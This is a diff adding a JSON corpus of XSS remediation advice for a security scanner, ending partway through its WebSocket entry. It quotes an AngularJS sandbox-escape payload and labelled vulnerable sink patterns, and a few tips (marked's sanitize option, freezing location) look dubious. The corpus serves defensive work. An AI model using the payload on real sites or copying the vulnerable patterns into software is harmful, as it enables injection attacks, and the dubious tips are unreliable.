@@ -1,0 +1,1220 @@
+{
+  "_meta": {
+    "note": "Remediation advice corpus (Phase 39). Moved out of fix_advice.py (~3000 lines of literal dicts); that module is now a thin loader. Edit this JSON to add or adjust entries.",
+    "schema": {
+      "headline": "one-line fix summary",
+      "detail": "why/how paragraph",
+      "code_example": "language-specific snippet",
+      "primary_cwe": "CWE id",
+      "also_consider": "list of extra hardening steps"
+    },
+    "entry_count": 123,
+    "version": 1
+  },
+  "default_advice": {
+    "headline": "Apply context-aware output encoding for all user-controlled input.",
+    "detail": "This finding type does not have a specific remediation entry yet, but the general XSS defense applies: encode user input at the point of output using the correct encoder for the context (HTML, attribute, JavaScript, URL). Use a framework with autoescape on, and never pass raw user input to a DOM sink (innerHTML, eval).",
+    "code_example": "# General XSS defense\nimport html\nsafe = html.escape(user_input)\n# Use textContent instead of innerHTML\nelement.textContent = user_input;\n",
+    "primary_cwe": "CWE-79",
+    "also_consider": [
+      "Deploy a strict Content-Security-Policy as defense-in-depth.",
+      "Enable Trusted Types to block DOM sinks at the browser level."
+    ]
+  },
+  "advice": {
+    "reflected": {
+      "headline": "HTML-encode user input before reflecting it into the page.",
+      "detail": "Reflected XSS occurs because user-controlled input (query parameter, form field, header) is written into the HTML response without escaping. Apply context-aware output encoding: HTML-encode for element body, attribute-encode for attribute values, JavaScript-encode for script-block strings. Never use a home-grown allowlist regex; use your framework's built-in escaping or a battle-tested library.",
+      "code_example": "# Python (Jinja2 / autoescape on by default)\n{{ user_input }}   {# auto-HTML-escaped #}\n\n# Python (manual, html module)\nimport html\nreturn f'<div>{html.escape(user_input)}</div>'\n\n# JavaScript (DOM API, safe)\ndiv.textContent = userInput;  // NOT innerHTML\n\n# Java (OWASP Java Encoder)\nimport org.owasp.encoder.Encode;\nout.write(\"<div>\" + Encode.forHtml(userInput) + \"</div>\");\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Deploy a strict Content-Security-Policy (script-src 'self' with nonces).",
+        "Set X-Content-Type-Options: nosniff to prevent MIME sniffing.",
+        "Add HttpOnly + SameSite=Lax to session cookies to limit cookie theft impact."
+      ]
+    },
+    "stored": {
+      "headline": "Encode on output, never on input; validate on input.",
+      "detail": "Stored XSS persists because the input is stored raw and rendered later without escaping. The fix is to encode AT THE POINT OF OUTPUT (when rendering into HTML), not at storage time -- different output contexts (HTML body, attribute, JS) need different encoders. Additionally validate input against an allowlist at storage time to reject obviously malicious shapes.",
+      "code_example": "# Store raw, encode on render (Jinja2 autoescape)\n@app.post('/comment')\ndef add_comment():\n    db.comments.insert({'text': request.form['text']})  # raw\n    return redirect('/view')\n\n@app.get('/view')\ndef view():\n    # Jinja2 autoescape=on -> {{ c.text }} is HTML-encoded\n    return render_template('view.html', comments=db.comments.all())\n\n# Input allowlist (reject < > to block HTML entirely)\nif '<' in text or '>' in text:\n    abort(400, 'HTML not allowed in comments')\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Render user content in a sandboxed <iframe srcdoc> with sandbox attribute.",
+        "Use DOMPurify on the client to sanitize HTML before innerHTML.",
+        "Audit every render path -- a single missed encoder reopens the hole."
+      ]
+    },
+    "dom": {
+      "headline": "Use textContent / safe DOM APIs; avoid innerHTML with untrusted data.",
+      "detail": "DOM-based XSS happens entirely client-side: untrusted data (location.hash, document.referrer, postMessage) flows into a dangerous sink (innerHTML, document.write, eval). The fix is to use safe sinks (textContent, createElement) or sanitize with DOMPurify before writing to innerHTML. For location/hash sources, validate against an allowlist before use.",
+      "code_example": "// BAD: element.innerHTML = location.hash.slice(1);\n// GOOD: use textContent for plain text\nelement.textContent = location.hash.slice(1);\n\n// GOOD: sanitize HTML with DOMPurify before innerHTML\nimport DOMPurify from 'dompurify';\nelement.innerHTML = DOMPurify.sanitize(userHtml, {\n  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],\n  ALLOWED_ATTR: ['href']\n});\n\n// GOOD: build DOM via createElement (no string concatenation)\nconst a = document.createElement('a');\na.href = sanitizeUrl(userUrl);  // reject javascript:/data:\na.textContent = userText;\ncontainer.appendChild(a);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enable Trusted Types (require-trusted-types-for 'script') to block innerHTML with raw strings.",
+        "Freeze the source: Object.freeze(location) patterns or framework guards.",
+        "Add a Content-Security-Policy as defense-in-depth (not a primary fix for DOM XSS)."
+      ]
+    },
+    "dom_dynamic": {
+      "headline": "Use textContent / safe DOM APIs; avoid innerHTML with untrusted data.",
+      "detail": "Same as 'dom' but confirmed via a real browser (Playwright). The dynamic confirmation proves the sink executes, so the fix is mandatory: replace innerHTML/outerHTML/document.write with textContent or DOMPurify-sanitized innerHTML.",
+      "code_example": "// Confirmed-execution sink -- must replace\n// BAD:  document.getElementById('o').innerHTML = userInput;\n// GOOD: document.getElementById('o').textContent = userInput;\n// GOOD: DOMPurify.sanitize(userInput) before innerHTML\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enable Trusted Types to make this class of bug unexploitable."
+      ]
+    },
+    "blind": {
+      "headline": "Encode on output in EVERY render path, including admin panels.",
+      "detail": "Blind XSS fires later, in a context the scanner cannot see (admin dashboard, support ticket view, log viewer). The fix is the same as stored XSS -- encode at every output point -- but you must audit render paths you don't normally test: admin UI, PDF export, email templates, log viewers.",
+      "code_example": "# Audit EVERY render path, not just the user-facing one\n# Admin panel (often missed):\n@app.get('/admin/tickets/<id>')\n@require_admin\ndef admin_ticket(id):\n    ticket = db.tickets.get(id)\n    # Jinja2 autoescape MUST be on here too\n    return render_template('admin/ticket.html', t=ticket)\n\n# Log viewer (another common blind sink):\n# If you render log lines into HTML, HTML-encode them.\nlog_line_html = html.escape(log_line)\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Run an automated blind-XSS callback (like this tool's --oob mode) in CI against staging.",
+        "Separate the admin session cookie scope to limit blast radius."
+      ]
+    },
+    "mutation_xss": {
+      "headline": "Use a real HTML sanitizer (DOMPurify), not regex-based filtering.",
+      "detail": "Mutation XSS survives naive sanitizers because the browser's HTML parser reinterprets the sanitized string on the parse-serialize-reparse round-trip (e.g. <svg><style> content mutates when assigned to innerHTML). Regex-based allowlists cannot model the HTML parser's state machine. Use DOMPurify (which runs the browser's own parser and re-serializes safely) or the server-side sanitizer that wraps it.",
+      "code_example": "// BAD: regex strip of <script> -- mXSS bypasses it\n// html = html.replace(/<script>/gi, '');\n\n// GOOD: DOMPurify (uses the browser parser, handles mXSS)\nimport DOMPurify from 'dompurify';\nclean = DOMPurify.sanitize(dirty, {USE_PROFILES: {html: true}});\n\n# Server-side (Python, bleach / nh3 -- wraps a real HTML parser)\nimport nh3\nclean = nh3.clean(dirty_html)  # uses ammonia (Rust) parser\n",
+      "primary_cwe": "CWE-87",
+      "also_consider": [
+        "Keep the sanitizer library updated -- new mXSS vectors are found regularly.",
+        "Forbid foreign content (<svg>, <math>) in user HTML if not needed."
+      ]
+    },
+    "dom_clobber": {
+      "headline": "Don't reference window/document properties via named element access; use getElementById.",
+      "detail": "DOM clobbering lets an attacker's <img id=x> shadow window.x, so JS that does `if (window.x)` hits the element instead of the expected object. The fix is to never rely on named-property access for globals; use document.getElementById or explicit variable declarations. Also sanitize id/name attributes in user-controlled HTML.",
+      "code_example": "// BAD: relies on window.config (clobberable by <img id=config>)\n// if (window.config && window.config.apiKey) { ... }\n\n// GOOD: explicit variable, no global lookup\nconst config = JSON.parse(document.getElementById('config-data').textContent);\nif (config && config.apiKey) { ... }\n\n# Sanitize id/name in user HTML (DOMPurify FORBID_ATTR)\nDOMPurify.sanitize(html, {FORBID_ATTR: ['id', 'name']});\n",
+      "primary_cwe": "CWE-87",
+      "also_consider": [
+        "Set a Content-Security-Policy that blocks inline event handlers."
+      ]
+    },
+    "template_ssti_angularjs": {
+      "headline": "Avoid {{ }} client-side template evaluation of user input; use data binding.",
+      "detail": "AngularJS (1.x) sandbox-escape payloads like {{constructor.constructor('alert(1)')()}} execute when user input is interpreted as a template expression. The fix is to use ng-bind (which escapes) instead of ng-bind-html or inline {{ }} for user data, or upgrade to Angular 2+ where the sandbox is removed and binding is safe by default.",
+      "code_example": "<!-- BAD: user input in template expression -->\n<div>{{ userInput }}</div>  <!-- sandbox-escapable in 1.x -->\n\n<!-- GOOD: ng-bind escapes HTML -->\n<div ng-bind=\"userInput\"></div>\n\n<!-- BEST: upgrade to Angular 2+ (no sandbox, safe by default) -->\n<div>{{ userInput }}</div>  <!-- safe in Angular 2+ -->\n",
+      "primary_cwe": "CWE-94",
+      "also_consider": [
+        "Disable the Angular sandbox entirely (ng-csp is not a fix).",
+        "Migrate off AngularJS 1.x -- it is end-of-life."
+      ]
+    },
+    "template_ssti_vue": {
+      "headline": "Use {{ }} (text binding) instead of v-html for user input.",
+      "detail": "Vue's v-html renders raw HTML (XSS risk); {{ }} and :text escape by default. The fix is to never pass user input to v-html; use {{ }} or v-text. If you must render rich HTML, sanitize with DOMPurify first.",
+      "code_example": "<!-- BAD: v-html with user input -->\n<div v-html=\"userInput\"></div>\n\n<!-- GOOD: {{ }} escapes HTML -->\n<div>{{ userInput }}</div>\n\n<!-- GOOD: sanitize before v-html (if rich HTML is required) -->\n<div v-html=\"DOMPurify.sanitize(userInput)\"></div>\n",
+      "primary_cwe": "CWE-94",
+      "also_consider": [
+        "Audit every v-html usage in the codebase."
+      ]
+    },
+    "jsonp_xss": {
+      "headline": "Validate/whitelist the JSONP callback name; return application/json with strict Content-Type.",
+      "detail": "JSONP callback injection lets an attacker set callback=<script> and execute arbitrary JS in the response. The fix is to whitelist the callback name (alphanumeric + underscore only, max 64 chars), return Content-Type: application/json (not text/javascript) for non-JSONP responses, and prefer CORS over JSONP for cross-origin data.",
+      "code_example": "# Whitelist callback name (alphanumeric + underscore)\nimport re\nif not re.fullmatch(r'[A-Za-z_][A-Za-z0-9_]{0,63}', callback):\n    abort(400, 'invalid callback name')\n\n# Prefer CORS over JSONP (modern browsers support CORS)\n@app.after_request\ndef add_cors(resp):\n    resp.headers['Access-Control-Allow-Origin'] = 'https://trusted.example'\n    return resp\n",
+      "primary_cwe": "CWE-83",
+      "also_consider": [
+        "Migrate off JSONP entirely; use CORS + fetch().",
+        "Set X-Content-Type-Options: nosniff to prevent response MIME sniffing."
+      ]
+    },
+    "csp_bypass": {
+      "headline": "Tighten CSP: remove unsafe-inline, switch to nonce/hash + strict-dynamic.",
+      "detail": "The current CSP is bypassable via a whitelisted CDN gadget, JSONP endpoint, or 'unsafe-inline'. The fix is to remove 'unsafe-inline', use per-request nonces (or Subresource Integrity hashes) for scripts, add 'strict-dynamic' so whitelisted CDNs don't matter, and forbid JSONP on whitelisted origins. Use the CSP Evaluator to verify.",
+      "code_example": "# Strong CSP (nonce-based + strict-dynamic)\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'nonce-{RANDOM}' 'strict-dynamic' 'unsafe-inline';\n  object-src 'none';\n  base-uri 'self';\n  frame-ancestors 'none';\n  require-trusted-types-for 'script';\n  report-uri /csp-report;\n\n# In HTML, every <script> must carry the nonce:\n<script nonce=\"{RANDOM}\">...</script>\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Add require-trusted-types-for 'script' to block DOM XSS at the sink.",
+        "Deploy a CSP report collector (report-uri) to catch violations in production.",
+        "Remove all JSONP endpoints; they are CSP bypass primitives."
+      ]
+    },
+    "polyglot_reflection": {
+      "headline": "Apply context-aware encoding for every output context.",
+      "detail": "Polyglot payloads work because they break out of multiple contexts (HTML body, attribute, script string, URL). The fix is context-aware encoding: HTML-encode for element body, attribute-encode for attributes, JavaScript-encode for script strings, URL-encode for href/src. A single encoder for all contexts leaves at least one breakout path.",
+      "code_example": "# Context-aware encoding (OWASP Java Encoder example)\nEncode.forHtml(userInput)        # HTML element body\nEncode.forHtmlAttribute(userInput) # double-quoted attribute\nEncode.forJavaScript(userInput)  # <script> string\nEncode.forUriComponent(userInput) # URL parameter\n\n# Python: use html.escape for HTML, json.dumps for JS strings\nimport html, json\nhtml_body = html.escape(userInput)\njs_string = json.dumps(userInput)  # safe for <script>var x = ...;</script>\n",
+      "primary_cwe": "CWE-87",
+      "also_consider": [
+        "Use a template engine with autoescape (Jinja2, Twig, Go html/template)."
+      ]
+    },
+    "postmessage_xss": {
+      "headline": "Always validate message origin; never pass message data to a DOM sink.",
+      "detail": "postMessage without an origin check lets any page send messages to the handler. If the handler passes event.data to innerHTML, it's DOM XSS. The fix is to (1) always specify the target origin in postMessage, (2) always check event.origin in the receiver, and (3) never pass event.data to a DOM sink without sanitization.",
+      "code_example": "// BAD: no origin check, data to innerHTML\nwindow.addEventListener('message', e => {\n  document.getElementById('o').innerHTML = e.data;\n});\n\n// GOOD: origin allowlist + textContent\nconst TRUSTED_ORIGINS = ['https://app.example.com'];\nwindow.addEventListener('message', e => {\n  if (!TRUSTED_ORIGINS.includes(e.origin)) return;\n  document.getElementById('o').textContent = e.data;\n});\n\n// Sender: always specify target origin (not '*')\niframe.contentWindow.postMessage(data, 'https://app.example.com');\n",
+      "primary_cwe": "CWE-1021",
+      "also_consider": [
+        "Validate the message shape (typeof / schema) before use."
+      ]
+    },
+    "prototype_pollution": {
+      "headline": "Block __proto__ / constructor.prototype in merge functions; use Object.create(null).",
+      "detail": "Prototype pollution lets an attacker inject properties into Object.prototype via a recursive merge of {\"__proto__\":{...}}. When a gadget later reads Object.prototype.onload, it triggers XSS. The fix is to (1) reject __proto__ and constructor keys in merge/extend functions, (2) use Map or Object.create(null) for dictionaries, (3) freeze Object.prototype.",
+      "code_example": "// BAD: recursive merge that allows __proto__\nfunction merge(target, src) {\n  for (const k in src) {\n    if (typeof src[k] === 'object') merge(target[k] = target[k] || {}, src[k]);\n    else target[k] = src[k];\n  }  // __proto__ flows through here!\n}\n\n// GOOD: block __proto__ / constructor.prototype\nfunction safeMerge(target, src) {\n  for (const k of Object.keys(src)) {\n    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;\n    if (typeof src[k] === 'object' && src[k] !== null) {\n      safeMerge(target[k] = target[k] || Object.create(null), src[k]);\n    } else target[k] = src[k];\n  }\n}\n",
+      "primary_cwe": "CWE-94",
+      "also_consider": [
+        "Use Object.freeze(Object.prototype) in development to catch pollution early.",
+        "Prefer Map over plain objects for key-value storage.",
+        "Update lodash/merge-deep/extend -- older versions are vulnerable."
+      ]
+    },
+    "service_worker_xss": {
+      "headline": "Validate the script URL in navigator.serviceWorker.register; restrict scope.",
+      "detail": "Service Worker registration with a user-controlled URL lets an attacker run persistent code (the SW intercepts all fetch events). The fix is to never pass user input to register(); if dynamic registration is required, validate the URL against an allowlist of same-origin paths and restrict the scope.",
+      "code_example": "// BAD: user-controlled URL\n// navigator.serviceWorker.register(userInput);\n\n// GOOD: allowlist of same-origin SW scripts\nconst ALLOWED_SW = ['/sw-main.js', '/sw-cache.js'];\nif (ALLOWED_SW.includes(userUrl)) {\n  navigator.serviceWorker.register(userUrl, {scope: '/'});\n}\n",
+      "primary_cwe": "CWE-80",
+      "also_consider": [
+        "Set Service-Worker-Allowed header to limit the max scope.",
+        "Require a nonce or CSRF token for SW registration requests."
+      ]
+    },
+    "web_worker_xss": {
+      "headline": "Validate the script URL in new Worker(); prefer same-origin blob URLs.",
+      "detail": "new Worker() with a user-controlled URL executes arbitrary JS in a worker context. The fix is to allowlist worker script URLs (same-origin only) or generate worker scripts from trusted templates via Blob URLs whose content you control.",
+      "code_example": "// BAD: new Worker(userUrl);\n\n// GOOD: allowlist\nconst ALLOWED_WORKERS = ['/w-main.js', '/w-calc.js'];\nif (ALLOWED_WORKERS.includes(userUrl)) new Worker(userUrl);\n\n// GOOD: generate from trusted template\nconst blob = new Blob([trustedScriptText], {type: 'text/javascript'});\nnew Worker(URL.createObjectURL(blob));\n",
+      "primary_cwe": "CWE-80",
+      "also_consider": [
+        "Set CSP script-src to restrict which scripts can become workers."
+      ]
+    },
+    "open_redirect_xss": {
+      "headline": "Validate redirect URLs against an allowlist; never redirect to javascript:.",
+      "detail": "Open redirect to XSS happens when location.href is set to a user-controlled value that starts with javascript: or data:. The fix is to validate the redirect target against an allowlist of trusted paths/hosts and reject any URL whose scheme is not http/https.",
+      "code_example": "// BAD: location.href = userInput;\n\n// GOOD: allowlist of trusted paths\nconst ALLOWED_REDIRECTS = ['/dashboard', '/login', '/home'];\nconst url = new URL(userInput, location.origin);\nif (url.origin === location.origin && ALLOWED_REDIRECTS.includes(url.pathname)) {\n  location.href = url.href;\n}\n",
+      "primary_cwe": "CWE-601",
+      "also_consider": [
+        "Reject relative URLs that contain // (protocol-relative) or javascript:."
+      ]
+    },
+    "header_xss": {
+      "headline": "Encode HTTP header values before reflecting them into HTML.",
+      "detail": "User-Agent / Referer / X-Forwarded-For values are often reflected into HTML (analytics, error pages, logs) without encoding. The fix is to HTML-encode every header value before writing it to a response, just like any other user input.",
+      "code_example": "# Python: HTML-encode header values before rendering\nimport html\nua = html.escape(request.headers.get('User-Agent', ''))\nreturn f'<div>Your browser: {ua}</div>'\n\n# Log viewer: encode log lines (which may contain header values)\nline_html = html.escape(log_line)\n",
+      "primary_cwe": "CWE-81",
+      "also_consider": [
+        "Never trust X-Forwarded-For for security decisions without a trusted proxy chain.",
+        "Strip CR/LF from header values to prevent response splitting (CWE-113)."
+      ]
+    },
+    "path_xss": {
+      "headline": "URL-decode and HTML-encode path components before reflecting them.",
+      "detail": "Path-based XSS reflects the URL path (e.g. /search/<input>) into the page. The fix is to URL-decode the path segment, then HTML-encode it before output. Also normalize the path to reject traversal sequences.",
+      "code_example": "# Python: decode + encode path segment\nfrom urllib.parse import unquote\nimport html\nsegment = html.escape(unquote(path_segment))\nreturn f'<div>Page: {segment}</div>'\n\n# Reject traversal (defense in depth)\nif '..' in path_segment or '\\\\' in path_segment:\n    abort(400, 'invalid path')\n",
+      "primary_cwe": "CWE-81",
+      "also_consider": [
+        "Use a framework router that normalizes paths automatically."
+      ]
+    },
+    "cookie_xss": {
+      "headline": "HTML-encode cookie values before reflecting them; prefer HttpOnly cookies.",
+      "detail": "Cookie values reflected into HTML (theme selectors, user preferences) cause XSS if the cookie is attacker-controllable (via document.cookie or subdomain injection). The fix is to HTML-encode cookie values on output and set HttpOnly on sensitive cookies so JS cannot read them.",
+      "code_example": "# HTML-encode cookie value before rendering\nimport html\ntheme = html.escape(request.cookies.get('theme', 'default'))\nreturn f'<body class=\"{theme}\">'  # also attribute-encode\n\n# Set HttpOnly on session cookies (JS cannot read them)\nresponse.set_cookie('session', sid, httponly=True, secure=True, samesite='Lax')\n",
+      "primary_cwe": "CWE-83",
+      "also_consider": [
+        "Validate cookie values against an allowlist on read.",
+        "Use SameSite=Lax to limit cross-site cookie injection."
+      ]
+    },
+    "error_page_xss": {
+      "headline": "HTML-encode the requested path in error pages (404/500).",
+      "detail": "Error pages often reflect the requested URL verbatim (e.g. 'Not found: /<input>'). The fix is to HTML-encode the path in the error page template, the same way you would for any user input.",
+      "code_example": "# Custom 404 handler (Flask)\nimport html\n@app.errorhandler(404)\ndef not_found(e):\n    path = html.escape(request.path)\n    return render_template_string(\n        '<h1>Not Found</h1><p>{{ path }}</p>', path=path), 404\n    # Jinja2 autoescape would also handle this\n",
+      "primary_cwe": "CWE-81",
+      "also_consider": [
+        "Use generic error pages without reflecting the requested path.",
+        "Log the raw path server-side; don't render it."
+      ]
+    },
+    "markdown_xss": {
+      "headline": "Configure the Markdown renderer to strip raw HTML; sanitize links.",
+      "detail": "Markdown allows raw HTML and [text](javascript:...) links, both of which cause XSS. The fix is to (1) disable raw HTML in the renderer, (2) sanitize link hrefs to reject javascript:/data:/vbscript: schemes, and (3) run the rendered HTML through DOMPurify as defense-in-depth.",
+      "code_example": "# Python (markdown library) -- disable raw HTML\nimport markdown\nhtml_out = markdown.markdown(md_text, extensions=['extra'],\n    output_format='html5')\n# Then sanitize with nh3 (rejects javascript: via url_schemes)\nimport nh3\nclean = nh3.clean(html_out,\n    attributes={'a': {'href'}},  # only href allowed on <a>\n    url_schemes={'http', 'https', 'mailto', 'tel'})  # no javascript:\n\n# JavaScript (marked + DOMPurify)\nimport { marked } from 'marked';\nimport DOMPurify from 'dompurify';\nmarked.setOptions({ sanitize: true });  // marked v3+\nconst clean = DOMPurify.sanitize(marked(mdText));\n",
+      "primary_cwe": "CWE-80",
+      "also_consider": [
+        "Reject [text](javascript:...) links at parse time.",
+        "Forbid inline HTML via the renderer's allow_raw_html=false option."
+      ]
+    },
+    "second_order": {
+      "headline": "Encode user input at BOTH the storage point and the rendering point.",
+      "detail": "Second-order XSS occurs because input is sanitized when stored but rendered unescaped elsewhere (e.g. an admin dashboard). The fix requires defense-in-depth: (1) validate/encode input when it is stored, AND (2) HTML-encode it again when rendered in any HTML context. Never assume 'it was sanitized on input' is sufficient -- different rendering contexts need different encoders.",
+      "code_example": "# Python -- encode at BOTH store and render time\nimport html\n# Store: validate length + content\ncomment = validate_input(user_input)\ndb.save(comment)\n# Render: encode for HTML context (ALWAYS, even if stored clean)\nsafe_comment = html.escape(comment)\nreturn f'<div>{safe_comment}</div>'\n\n# JavaScript (React) -- avoid dangerouslySetInnerHTML\n// BAD: <div dangerouslySetInnerHTML={{__html: comment}} />\n// GOOD: <div>{comment}</div>  // React auto-escapes\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Use CSP 'script-src' as defense-in-depth (blocks inline script execution).",
+        "Audit ALL rendering surfaces that display stored user data, not just the main view.",
+        "Consider stored input allowlisting (reject anything with < or >) for admin-only fields."
+      ]
+    },
+    "time_based_xss": {
+      "headline": "Apply context-aware encoding; use strict CSP to block resource fetches.",
+      "detail": "Time-based XSS exploits resource-fetch side channels (CSS @import, img src, script src) to confirm execution even when alert() is blocked by CSP. The fix is to (1) encode user input so reflected HTML tags are not parsed as real elements, and (2) deploy a strict CSP that restricts resource origins (default-src 'self') so callback fetches to attacker-controlled URLs are blocked.",
+      "code_example": "# Python -- encode so <style>/<img> are not parsed\nimport html\nsafe = html.escape(user_input)\nreturn f'<div>{safe}</div>'\n\n# CSP header (strict -- blocks external resource fetches)\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; style-src 'self'; img-src 'self' data:;\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block external resource fetches via CSP connect-src/img-src/style-src.",
+        "Use nonce-based CSP (script-src 'nonce-XXX') instead of 'unsafe-inline'.",
+        "Monitor for unexpected outbound requests from the application server."
+      ]
+    },
+    "fuzzer_triage": {
+      "headline": "Investigate and sanitize the flagged injectable parameter.",
+      "detail": "The fuzzer identified this parameter as injectable based on response-difference scoring (reflection, context change, encoding traces). This is a triage finding, not a confirmed XSS. Investigate whether the parameter reflects user input unescaped and apply context-appropriate output encoding.",
+      "code_example": "# Verify manually: send a test marker and check reflection\nimport requests\nr = requests.get(url, params={'PARAM': 'xssmarker123'})\nif 'xssmarker123' in r.text:\n    print('Reflected -- apply HTML encoding')\nimport html\nsafe = html.escape(user_input)\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Run a full XSS scan on this parameter for confirmation.",
+        "Apply input validation (allowlist) in addition to output encoding."
+      ]
+    },
+    "framework_xss": {
+      "headline": "Avoid dangerouslySetInnerHTML / v-html / {@html} / unsafeHTML; use framework auto-escaping.",
+      "detail": "Framework XSS occurs when a framework's raw HTML injection directive is used (React dangerouslySetInnerHTML, Vue v-html, Svelte {@html}, Angular bypassSecurityTrustHtml, Lit unsafeHTML). These directives bypass the framework's built-in auto-escaping. The fix is to avoid these directives entirely; if raw HTML is truly needed, sanitize it with DOMPurify before injection.",
+      "code_example": "# React -- BAD vs GOOD\n// BAD: <div dangerouslySetInnerHTML={{__html: data}} />\n// GOOD: <div>{data}</div>  // auto-escaped\n\n# Vue -- BAD vs GOOD\n<!-- BAD: <div v-html=\"data\"></div> -->\n<!-- GOOD: <div>{{ data }}</div> -->\n\n# Lit -- BAD vs GOOD\n// BAD:  html`<div>${unsafeHTML(data)}</div>`\n// GOOD: html`<div>${data}</div>`  // auto-escaped\n\n# If raw HTML is truly needed, sanitize first:\nimport DOMPurify from 'dompurify';\nconst clean = DOMPurify.sanitize(data);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enable framework strict mode / CSP nonce to catch bypasses.",
+        "Audit all uses of dangerouslySetInnerHTML / v-html / {@html} / unsafeHTML in the codebase.",
+        "Consider Content Security Policy as defense-in-depth."
+      ]
+    },
+    "framework_lit_xss": {
+      "headline": "Avoid unsafeHTML() in Lit templates; use auto-escaped interpolation.",
+      "detail": "Lit (lit-html / LitElement) auto-escapes all interpolations in html`` template literals by default.  The unsafeHTML() and unsafeSVG() directives disable this escaping and render raw HTML/SVG, which is the canonical Lit XSS sink.  Polymer legacy components that assign to this.$.element.innerHTML or use <dom-module> with script-based templates are also vulnerable.  The fix is to use plain ${value} interpolation (auto-escaped); if raw HTML is truly required, sanitize with DOMPurify before passing to unsafeHTML().",
+      "code_example": "// Lit -- BAD vs GOOD\nimport { html, render } from 'lit';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\n// BAD -- raw HTML injection\nrender(html`<div>${unsafeHTML(userInput)}</div>`, root);\n\n// GOOD -- auto-escaped interpolation\nrender(html`<div>${userInput}</div>`, root);\n\n// If raw HTML is required, sanitize first:\nimport DOMPurify from 'dompurify';\nconst clean = DOMPurify.sanitize(userInput);\nrender(html`<div>${unsafeHTML(clean)}</div>`, root);\n\n# Polymer legacy -- BAD\nthis.$.content.innerHTML = userInput;  // raw HTML sink\n# Polymer legacy -- GOOD\nthis.$.content.textContent = userInput;  // auto-escaped",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Audit all uses of unsafeHTML() / unsafeSVG() in the codebase.",
+        "Use Trusted Types to guard innerHTML sinks in Polymer components.",
+        "Migrate Polymer legacy components to LitElement with auto-escaping."
+      ]
+    },
+    "template_ssti": {
+      "headline": "Use a sandboxed template engine; never render user input as template expressions.",
+      "detail": "Server-side template injection (SSTI) occurs when user input is rendered as part of a template expression ({{ ... }}), allowing arbitrary code execution. The fix is to (1) never pass user input into template expression contexts, (2) use sandboxed template engines (Jinja2 SandboxedEnvironment, Tornado autoescape), and (3) encode user input before passing it as a template variable.",
+      "code_example": "# Python (Jinja2) -- use sandboxed environment\nfrom jinja2 import Environment, BaseLoader\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment(autoescape=True)\ntemplate = env.from_string('<div>{{ user_input }}</div>')\nsafe = template.render(user_input=user_data)\n# autoescape=True ensures {{ }} output is HTML-encoded\n\n# JavaScript (Vue) -- never use v-html with user input\n<!-- BAD: <div v-html=\"userInput\"></div> -->\n<!-- GOOD: <div>{{ userInput }}</div> -->\n",
+      "primary_cwe": "CWE-1336",
+      "also_consider": [
+        "Never allow user input to define template structure or expressions.",
+        "Use allowlist input validation for template-related parameters.",
+        "Run template engines in sandboxed mode in production."
+      ]
+    },
+    "graphql_xss": {
+      "headline": "Sanitize GraphQL response data before rendering; never pass raw response fields to innerHTML / dangerouslySetInnerHTML / v-html.",
+      "detail": "GraphQL XSS arises because the client treats GraphQL response data as trusted.  Three concrete vectors exist: (1) the server reflects argument values in error messages that the client renders raw; (2) the server reflects aliases verbatim as JSON keys and the client renders keys raw; (3) the client renders a stored field (set via a mutation) using an unsafe sink.  The fix is to apply context-aware encoding to EVERY GraphQL field at the point of rendering, regardless of whether the field is supposed to be safe.  Additionally, the server should NOT echo raw argument values in error messages -- return a generic error code and log the details server-side.",
+      "code_example": "# React (Apollo Client) -- render GraphQL data safely\nconst { data, loading, error } = useQuery(GET_USER);\n// BAD: <div dangerouslySetInnerHTML={{__html: data.user.bio}} />\n// GOOD: <div>{data.user.bio}</div>   // React auto-escapes\n\n# Vue (Apollo) -- render GraphQL data safely\n<!-- BAD: <div v-html=\"data.user.bio\"></div> -->\n<!-- GOOD: <div>{{ data.user.bio }}</div> -->\n\n# Server-side: do NOT echo argument values in errors\n# BAD:  raise Exception(f'unknown user: {name}')\n# GOOD: raise GraphQLError('unknown user', extensions={'code': 'USER_NOT_FOUND'})\n\n# Sanitize HTML fields with DOMPurify before rendering\nimport DOMPurify from 'dompurify';\nconst safe = DOMPurify.sanitize(data.user.bio);\nreturn <div dangerouslySetInnerHTML={{__html: safe}} />;\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Disable GraphQL introspection in production (Apollo: introspection: false).",
+        "Validate the Origin header on WebSocket / GraphQL HTTP handshakes to prevent CSWSH.",
+        "Apply a strict Content-Security-Policy (script-src 'self' with nonces).",
+        "Use persisted queries / allowlist to prevent arbitrary query execution."
+      ]
+    },
+    "graphql_introspection": {
+      "headline": "Disable GraphQL introspection in production.",
+      "detail": "Open introspection lets an attacker enumerate the entire schema (types, fields, arguments, mutations), making it trivial to craft precise alias- or argument-based XSS payloads.  Disable introspection in production and gate it behind authentication in non-production environments.",
+      "code_example": "# Apollo Server -- disable introspection in production\nimport { ApolloServer } from '@apollo/server';\nimport { production } from './env';\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  introspection: !production,  // disabled in prod\n});\n\n# Graphene (Python) -- disable introspection\nfrom graphene import Schema\nschema = Schema(query=Query, auto_camelcase=True)\n# In production, wrap the executor to reject __schema / __type queries\n",
+      "primary_cwe": "CWE-94",
+      "also_consider": [
+        "Use persisted queries so clients cannot send arbitrary queries.",
+        "Apply query depth limiting and complexity analysis to prevent DoS.",
+        "Log and rate-limit GraphQL requests to detect enumeration attempts."
+      ]
+    },
+    "websocket_xss": {
+      "headline": "Validate the origin of WebSocket messages; never pass event.data to a DOM sink unescaped.",
